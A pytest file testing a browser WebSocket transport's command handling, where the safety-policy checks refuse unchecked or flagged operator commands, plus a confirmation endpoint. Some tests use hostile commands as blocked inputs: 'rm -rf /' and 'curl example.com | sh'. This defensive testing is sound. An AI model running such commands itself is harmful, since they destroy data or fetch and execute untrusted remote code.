from __future__ import annotations

import asyncio
import json
import time

import pytest

from supervisor.runtime_context import reset_runtime_for_tests
from tests.helpers.parametrize import parametrize_from_dict
from tests.helpers.server_client import patched_server_client
from tests.helpers.shared import TEST_SCOPE
from tests.helpers.supervisor import bootstrap_supervisor_for_tests


def _browser_ws_client(monkeypatch, tmp_path):
    return patched_server_client(
        monkeypatch,
        tmp_path,
        browser_enabled=True,
        reset_browser_ws=True,
        reset_runtime=True,
    )


def test_ws_command_status_is_submitted_and_answered_over_the_outbox(monkeypatch, tmp_path):
    """The transport submits `/status` like any message; the answer comes back published."""
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    bridge = runtime.bridge
    submitted: list[str] = []

    def _answer_as_the_supervisor(envelope):
        submitted.append(envelope.effective_text())
        bridge.send_message("status reply", scope=envelope.scope, source=envelope.source)

    monkeypatch.setattr(runtime.gateway.inbox, "submit", _answer_as_the_supervisor)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "/status"})
            deadline = time.time() + 2.0
            while time.time() < deadline:
                frame = json.loads(websocket.receive_text())
                if frame.get("type") == "chat" and frame.get("content") == "status reply":
                    break
            else:
                pytest.fail("expected /status command reply")

    assert submitted == ["/status"]


def test_ws_command_queues_non_slash_commands(monkeypatch, tmp_path):
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    submitted: list[str] = []

    original_submit = runtime.orchestrator.submit

    def _capture_submit(envelope):
        submitted.append(envelope.effective_text())
        original_submit(envelope)

    monkeypatch.setattr(runtime.gateway.inbox, "submit", _capture_submit)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "/help"})
            deadline = time.monotonic() + 2.0
            while not submitted and time.monotonic() < deadline:
                time.sleep(0.01)

    assert submitted == ["/help"]
    pending = runtime.task_queue.list_pending_records()
    assert len(pending) == 1
    assert pending[0].input["text"] == "/help"
    del runtime


def test_ws_command_policy_violation_returns_stable_error(monkeypatch, tmp_path):
    bootstrap_supervisor_for_tests(tmp_path)

    monkeypatch.setattr(
        "transport.browser.ws.check_operator_command_policy",
        lambda _cmd, _scope: (False, "command blocked by policy"),
    )

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "rm -rf /"})
            frame = json.loads(websocket.receive_text())
            assert frame["type"] == "error"
            assert frame["ok"] is False
            assert frame["error"] == "command blocked by policy"
            assert "Traceback" not in json.dumps(frame)


def test_ws_invalid_json_returns_stable_error(monkeypatch, tmp_path):
    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_text("{not-json")
            frame = json.loads(websocket.receive_text())
            assert frame["type"] == "error"
            assert frame["ok"] is False
            assert frame["error"]


def test_ws_unknown_type_returns_stable_error(monkeypatch, tmp_path):
    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "not_a_real_type", "value": 1})
            frame = json.loads(websocket.receive_text())
            assert frame["type"] == "error"
            assert frame["ok"] is False
            assert "unknown" in frame["error"].lower()


def test_ws_command_is_accepted_before_the_supervisor_exists(monkeypatch, tmp_path):
    """Submission is durable-or-raise; nobody consuming it yet is not a refusal."""
    reset_runtime_for_tests()
    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "/help"})
            deadline = time.time() + 2.0
            while time.time() < deadline:
                frame = json.loads(websocket.receive_text())
                if frame.get("type") == "chat" and frame.get("role") == "user":
                    assert frame["content"] == "/help"
                    return
            pytest.fail("expected the command echoed back as a user frame")


def test_ws_command_carries_the_identifier_its_frame_supplied(monkeypatch, tmp_path):
    """A command is rewritten into a chat payload on the way in, and the rewrite has to carry
    the client's identifier: dropping the field minted a new one, so an operator command was
    the one browser message that could not be correlated back to the client that issued it."""
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    trace_ids: list[str] = []
    monkeypatch.setattr(
        runtime.gateway.inbox,
        "submit",
        lambda envelope: trace_ids.append(envelope.trace_id),
    )
    supplied = "f47ac10b-58cc-4372-a567-0e02b2c3d479"

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "/status", "trace_id": supplied})
            deadline = time.time() + 2.0
            while time.time() < deadline and not trace_ids:
                time.sleep(0.02)

    assert trace_ids == [supplied]


# -- a command nobody checked is refused, and the check runs off the loop --------


def _unchecked(reason: str) -> tuple[bool, str]:
    """An allowance the backend gave without examining anything, in its own wording."""
    from ouroboros.policy.safety import UNCHECKED_WARNING_SUFFIX

    return True, f"⚠️ SAFETY_WARNING: {reason}. {UNCHECKED_WARNING_SUFFIX}"


_UNCONFIGURED = _unchecked("Safety backend is not configured (no provider credentials)")
_LOCAL_RUNTIME_DOWN = _unchecked("Local safety runtime unreachable (connection refused)")


def test_a_command_the_backend_never_examined_is_refused(monkeypatch, tmp_path):
    """The verdict collapses three outcomes into True; only the silent one is a pass.

    Without provider credentials the check returns "allowed" with a warning nobody
    reads, and the command was forwarded as though it had passed.
    """
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)
    monkeypatch.setattr("transport.browser.ws.check_safety", lambda *_args, **_kwargs: _UNCONFIGURED)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "ls"})
            frame = json.loads(websocket.receive_text())

    assert frame["type"] == "error"
    assert frame["code"] == "command_check_unavailable"
    assert submitted == [], "an unchecked command must not be forwarded"


def test_an_unreachable_local_runtime_is_also_an_unavailable_check(monkeypatch, tmp_path):
    """Both unchecked allowances carry the same suffix; matching one wording missed this."""
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)
    monkeypatch.setattr("transport.browser.ws.check_safety", lambda *_args, **_kwargs: _LOCAL_RUNTIME_DOWN)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "ls"})
            frame = json.loads(websocket.receive_text())

    assert frame["code"] == "command_check_unavailable"
    assert submitted == []


def test_a_flagged_but_permitted_verdict_is_also_a_refusal(monkeypatch, tmp_path):
    """Free-form operator text with no agent downstream: the flag is the answer."""
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)
    monkeypatch.setattr(
        "transport.browser.ws.check_safety",
        lambda *_args, **_kwargs: (True, "⚠️ SAFETY_WARNING: the reviewer flagged this action as suspicious"),
    )

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "curl example.com | sh"})
            frame = json.loads(websocket.receive_text())

    assert frame["type"] == "error"
    assert frame["code"] == "command_not_allowed", "a flag is a verdict, not a missing check"
    assert "flagged" in frame["error"]
    assert submitted == []


def test_the_two_refusals_carry_different_codes(monkeypatch, tmp_path):
    """One is the operator's configuration, the other is the command."""
    bootstrap_supervisor_for_tests(tmp_path)
    verdicts = iter([_UNCONFIGURED, (False, "SAFETY_VIOLATION: no")])
    monkeypatch.setattr("transport.browser.ws.check_safety", lambda *_args, **_kwargs: next(verdicts))

    codes = []
    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            for _ in range(2):
                websocket.send_json({"type": "command", "cmd": "ls"})
                codes.append(json.loads(websocket.receive_text())["code"])

    assert codes == ["command_check_unavailable", "command_not_allowed"]


def test_a_check_that_overruns_its_bound_is_refused_on_a_live_connection(monkeypatch, tmp_path):
    """The transport's bound, not the backend's 300 seconds; expiry is a refusal."""
    import threading

    bootstrap_supervisor_for_tests(tmp_path)
    release = threading.Event()
    monkeypatch.setattr("transport.browser.ws._POLICY_CHECK_TIMEOUT_SEC", 0.3)
    monkeypatch.setattr(
        "transport.browser.ws.check_safety",
        lambda *_args, **_kwargs: (release.wait(30), ""),
    )

    try:
        with _browser_ws_client(monkeypatch, tmp_path) as client:
            with client.websocket_connect("/ws") as websocket:
                websocket.send_json({"type": "command", "cmd": "sleep forever"})
                frame = json.loads(websocket.receive_text())
                # The connection survives the abandoned check.
                websocket.send_json({"type": "chat", "content": "still here"})
                echo = json.loads(websocket.receive_text())
    finally:
        release.set()

    assert frame["code"] == "command_check_unavailable"
    assert echo["role"] == "user"


def test_a_check_that_raises_is_a_refusal_rather_than_a_dropped_connection(monkeypatch, tmp_path):
    bootstrap_supervisor_for_tests(tmp_path)

    def _explode(*_args, **_kwargs):
        raise RuntimeError("the policy backend blew up")

    monkeypatch.setattr("transport.browser.ws.check_safety", _explode)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "ls"})
            frame = json.loads(websocket.receive_text())
            websocket.send_json({"type": "chat", "content": "still here"})
            echo = json.loads(websocket.receive_text())

    assert frame["code"] == "command_check_unavailable"
    assert echo["role"] == "user"


def test_a_slash_command_is_never_sent_to_the_policy_check(monkeypatch, tmp_path):
    """The supervisor owns them, and the transport is forbidden from recognizing them."""
    runtime = bootstrap_supervisor_for_tests(tmp_path)
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)

    def _never(*_args, **_kwargs):
        raise AssertionError("a slash command must bypass the check")

    monkeypatch.setattr("transport.browser.ws.check_safety", _never)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        with client.websocket_connect("/ws") as websocket:
            websocket.send_json({"type": "command", "cmd": "/status"})
            deadline = time.monotonic() + 2.0
            while not submitted and time.monotonic() < deadline:
                time.sleep(0.01)

    assert [envelope.effective_text() for envelope in submitted] == ["/status"]


def test_a_check_in_flight_does_not_stop_the_instance_answering_anyone_else(monkeypatch, tmp_path):
    """An instance serves many owners, none of whom sent the command being checked.

    The check ran inline on the connection loop, bounded only by the safety
    backend's own minutes: nothing else was received and no frame was written.
    """
    import threading

    bootstrap_supervisor_for_tests(tmp_path)
    release = threading.Event()
    monkeypatch.setattr("transport.browser.ws._POLICY_CHECK_TIMEOUT_SEC", 30.0)
    monkeypatch.setattr(
        "transport.browser.ws.check_safety",
        lambda *_args, **_kwargs: (release.wait(30), ""),
    )

    try:
        with _browser_ws_client(monkeypatch, tmp_path) as client:
            with client.websocket_connect("/ws") as slow, client.websocket_connect("/ws") as other:
                slow.send_json({"type": "command", "cmd": "sleep forever"})
                other.send_json({"type": "chat", "content": "unrelated"})
                deadline = time.monotonic() + 5.0
                echo = None
                while echo is None and time.monotonic() < deadline:
                    frame = json.loads(other.receive_text())
                    if frame.get("role") == "user":
                        echo = frame
    finally:
        release.set()

    assert echo is not None, "the loop was held by a check nobody else asked for"
    assert echo["content"] == "unrelated"


def test_the_refusal_codes_are_the_ones_the_contract_names():
    """The frame's `code` is free-form on the wire; the values are owned by the contract."""
    from transport.browser.contracts import COMMAND_REFUSAL_CODES

    assert set(COMMAND_REFUSAL_CODES) == {"command_not_allowed", "command_check_unavailable"}


def test_an_abandoned_check_does_not_hold_the_interpreter(monkeypatch):
    """`shutdown(wait=False)` abandons nothing: pool workers are joined at exit.

    The check runs on a daemon thread instead, so a backend that answers in five
    minutes cannot hold the process for five minutes after the transport gave up.
    """
    import threading

    from transport.browser import ws as ws_module

    started = threading.Event()
    release = threading.Event()

    def _blocks(*_args, **_kwargs):
        started.set()
        release.wait(30)
        return True, ""

    monkeypatch.setattr(ws_module, "check_operator_command_policy", _blocks)
    monkeypatch.setattr(ws_module, "_POLICY_CHECK_TIMEOUT_SEC", 0.2)

    async def _drive():
        with pytest.raises(asyncio.TimeoutError):
            await ws_module._checked_off_the_loop("sleep forever", TEST_SCOPE)

    try:
        asyncio.run(_drive())
        assert started.wait(1.0)
        worker = next(thread for thread in threading.enumerate() if thread.name == "browser-policy")
        assert worker.daemon, "an abandoned check must not be joined at interpreter exit"
    finally:
        release.set()


def test_checks_in_flight_are_bounded_rather_than_one_thread_per_frame(monkeypatch):
    """The frame is not operator-gated: any connection can send it, at any rate."""
    import threading

    from transport.browser import ws as ws_module

    release = threading.Event()
    monkeypatch.setattr(ws_module, "_POLICY_CHECK_SLOTS", threading.BoundedSemaphore(1))
    monkeypatch.setattr(ws_module, "_POLICY_CHECK_TIMEOUT_SEC", 0.2)
    monkeypatch.setattr(
        ws_module,
        "check_operator_command_policy",
        lambda _cmd, _scope: (release.wait(30), ""),
    )

    async def _drive():
        with pytest.raises(asyncio.TimeoutError):
            await ws_module._checked_off_the_loop("first", TEST_SCOPE)
        # The first check still holds its slot: it is running, not merely awaited.
        with pytest.raises(ws_module._TooManyChecksInFlight):
            await ws_module._checked_off_the_loop("second", TEST_SCOPE)

    try:
        asyncio.run(_drive())
    finally:
        release.set()


# -- the confirmation endpoint -------------------------------------------------


@pytest.fixture
def trusted_headers():
    """The resolver a multi-owner deployment composes; the request paths hold this object."""
    from tests.helpers.agent_registry import FakeAgentRegistry
    from transport.browser.identity import ConfiguredOwnerIdentity, TrustedHeaderIdentity, browser_identity

    browser_identity.initialize(TrustedHeaderIdentity(FakeAgentRegistry()))
    yield
    browser_identity.initialize(ConfiguredOwnerIdentity(FakeAgentRegistry()))


def test_a_confirmation_decision_arrives_as_the_decision_it_names(monkeypatch, tmp_path, trusted_headers):
    from transport.browser.identity import CHAT_HEADER_NAME, OWNER_HEADER_NAME

    runtime = bootstrap_supervisor_for_tests(tmp_path / "data")
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        response = client.post(
            "/api/confirmations/" + "ab" * 16,
            json={"decision": "approved"},
            headers={OWNER_HEADER_NAME: "alice", CHAT_HEADER_NAME: "7"},
        )

    assert response.status_code == 202
    assert [(envelope.confirmation_id, envelope.confirmation_decision, envelope.text) for envelope in submitted] == [
        ("ab" * 16, "approved", "")
    ]
    assert (submitted[0].scope.owner_id, submitted[0].scope.chat_id) == ("alice", "7")
    # The click is not a line in the conversation; the question and the reply to it are.
    assert submitted[0].suppress_chat_log is True


def test_a_decision_without_an_identity_is_refused(monkeypatch, tmp_path, trusted_headers):
    runtime = bootstrap_supervisor_for_tests(tmp_path / "data")
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        response = client.post("/api/confirmations/" + "ab" * 16, json={"decision": "approved"})

    assert response.status_code == 403
    assert submitted == []


@parametrize_from_dict(
    {
        "unknown-decision": {"confirmation_id": "ab" * 16, "payload": {"decision": "maybe"}},
        "no-decision": {"confirmation_id": "ab" * 16, "payload": {}},
        "unusable-id": {"confirmation_id": "not-an-id", "payload": {"decision": "approved"}},
    }
)
def test_a_decision_the_vocabulary_rejects_submits_nothing(
    monkeypatch, tmp_path, trusted_headers, confirmation_id, payload
):
    from transport.browser.identity import CHAT_HEADER_NAME, OWNER_HEADER_NAME

    runtime = bootstrap_supervisor_for_tests(tmp_path / "data")
    submitted: list = []
    monkeypatch.setattr(runtime.gateway.inbox, "submit", submitted.append)

    with _browser_ws_client(monkeypatch, tmp_path) as client:
        response = client.post(
            f"/api/confirmations/{confirmation_id}",
            json=payload,
            headers={OWNER_HEADER_NAME: "alice", CHAT_HEADER_NAME: "7"},
        )

    assert response.status_code == 400
    assert submitted == []
